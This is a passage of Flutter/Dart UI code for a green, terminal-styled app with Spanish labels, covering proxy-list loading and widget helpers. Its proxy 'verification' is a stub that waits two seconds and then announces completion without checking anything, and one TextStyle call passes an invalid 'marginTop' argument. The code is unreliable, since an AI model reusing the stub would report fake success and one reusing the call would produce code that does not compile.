        _btn('📂 CARGAR ARCHIVO', color: cMagenta, onTap: _loadProxies),
        const SizedBox(height: 8),
        _proxyRow('TOTAL', '${_proxies.length}', cGreen),
        _proxyRow('ESTADO', _proxies.isEmpty ? 'Sin proxies' : 'Cargados', cGreen),
        const SizedBox(height: 8),
        Row(children: [
          Expanded(child: _btn('✓ VERIFICAR', color: cGreen, onTap: _verifyProxies)),
          const SizedBox(width: 7),
          Expanded(child: _btn('✗ LIMPIAR', color: cRed,
            onTap: () => setState(() => _proxies.clear()))),
        ]),
      ])),
    ]);
  }

  Future<void> _loadProxies() async {
    final result = await FilePicker.platform.pickFiles(
      type: FileType.custom, allowedExtensions: ['txt']);
    if (result == null) return;
    final file = File(result.files.single.path!);
    final text = await file.readAsString();
    final lines = text.split('\n').map((l) => l.trim())
      .where((l) => l.isNotEmpty && l.contains(':')).toList();
    setState(() { _proxies.clear(); _proxies.addAll(lines); });
    _showToast('✓ ${lines.length} proxies');
  }

  Future<void> _verifyProxies() async {
    if (_proxies.isEmpty) { _showToast('⚠ Carga proxies'); return; }
    _showToast('⌛ Verificando...');
    await Future.delayed(const Duration(seconds: 2));
    _showToast('✓ Verificación completada');
  }

  // ═══ WIDGETS ═══
  Widget _card({Color color = cBorder, required Widget child}) => Container(
    margin: const EdgeInsets.only(bottom: 10),
    padding: const EdgeInsets.all(12),
    decoration: BoxDecoration(
      gradient: const LinearGradient(
        begin: Alignment.topLeft, end: Alignment.bottomRight,
        colors: [Color(0xFF000C00), Color(0xFF000600)]),
      borderRadius: BorderRadius.circular(6),
      border: Border.all(color: cBorder),
    ),
    child: Stack(children: [
      Positioned(left: -12, top: -12, bottom: -12,
        child: Container(width: 2,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topCenter, end: Alignment.bottomCenter,
              colors: [color, Colors.transparent]),
          ),
        ),
      ),
      Padding(padding: const EdgeInsets.only(left: 4), child: child),
    ]),
  );

  Widget _cardTitle(String t) => Padding(
    padding: const EdgeInsets.only(bottom: 10),
    child: Row(children: [
      const Text('▸', style: TextStyle(color: cGreen, fontSize: 12)),
      const SizedBox(width: 6),
      Text(t, style: const TextStyle(fontSize: 11, color: cDarkGreen,
        letterSpacing: 2.5, fontWeight: FontWeight.bold)),
    ]),
  );

  Widget _sectionTitle(String t) => Padding(
    padding: const EdgeInsets.only(bottom: 7, top: 4),
    child: Row(children: [
      Text(t, style: const TextStyle(fontSize: 10, color: cDarkGreen,
        letterSpacing: 3, fontWeight: FontWeight.bold)),
      const SizedBox(width: 8),
      Expanded(child: Container(height: 1,
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [cBorder, Colors.transparent])))),
    ]),
  );

  Widget _btn(String label, {required Color color, required VoidCallback onTap}) =>
    GestureDetector(
      onTap: onTap,
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.symmetric(vertical: 12),
        margin: const EdgeInsets.only(bottom: 7),
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [
            color.withOpacity(0.05), color.withOpacity(0.1)]),
          borderRadius: BorderRadius.circular(4),
          border: Border.all(color: color.withOpacity(0.5)),
          boxShadow: [BoxShadow(color: color.withOpacity(0.1), blurRadius: 15)],
        ),
        child: Text(label, textAlign: TextAlign.center,
          style: TextStyle(color: color, fontSize: 13,
            fontWeight: FontWeight.bold, letterSpacing: 2,
            shadows: [Shadow(color: color, blurRadius: 8)])),
      ),
    );

  Widget _smallBtn(String label, {required Color color, required VoidCallback onTap}) =>
    GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 7),
        decoration: BoxDecoration(
          color: color.withOpacity(0.07),
          borderRadius: BorderRadius.circular(4),
          border: Border.all(color: color.withOpacity(0.3)),
        ),
        child: Text(label, style: TextStyle(color: color, fontSize: 10,
          fontWeight: FontWeight.bold, letterSpacing: 1.5)),
      ),
    );

  Widget _badge(String text, Color color) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
    decoration: BoxDecoration(
      color: color.withOpacity(0.08),
      borderRadius: BorderRadius.circular(2),
      border: Border.all(color: color.withOpacity(0.2)),
    ),
    child: Text(text, style: TextStyle(fontSize: 8, color: color, letterSpacing: 1)),
  );

  Widget _infoBox(String label, String val, Color color) => Container(
    padding: const EdgeInsets.all(7),
    decoration: BoxDecoration(
      color: cBg,
      borderRadius: BorderRadius.circular(3),
      border: Border.all(color: cBorder),
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(label, style: const TextStyle(fontSize: 9, color: cDarkGreen)),
      Text(val, style: TextStyle(fontSize: 11, color: color, marginTop: 2)),
    ]),
  );

  Widget _proxyRow(String label, String val, Color color) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 6),
    child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
      Text(label, style: const TextStyle(fontSize: 10, color: cDarkGreen, letterSpacing: 1)),
      Text(val, style: TextStyle(fontSize: 10, color: color)),
    ]),
  );

  Widget _empty(String icon, String msg) => Center(
    child: Padding(padding: const EdgeInsets.all(22), child: Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        Text(icon, style: const TextStyle(fontSize: 26)),
        const SizedBox(height: 7),
        Text(msg, style: const TextStyle(fontSize: 10, color: cDarkGreen, letterSpacing: 1)),
      ],
    )),
  );

  Widget _input(String hint, {required String id}) {
    final ctrl = id == 'srv' ? _srvController : TextEditingController();
    return TextField(
      controller: ctrl,
      style: const TextStyle(color: cGreen, fontSize: 12, fontFamily: 'monospace'),
      decoration: InputDecoration(
        hintText: hint,
        hintStyle: const TextStyle(color: cDarkGreen, fontSize: 12),
        filled: true, fillColor: Colors.black54,
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(3),
          borderSide: const BorderSide(color: cBorder)),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(3),
          borderSide: const BorderSide(color: cBorder)),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(3),
          borderSide: const BorderSide(color: cGreen)),
        contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
      ),
    );
  }
}

extension IntFormat on int {
  String toLocaleString() {
    final s = toString();
    final buf = StringBuffer();
    for (var i = 0; i < s.length; i++) {
      if (i > 0 && (s.length - i) % 3 == 0) buf.write(',');
      buf.write(s[i]);
    }
    return buf.toString();
  }
}
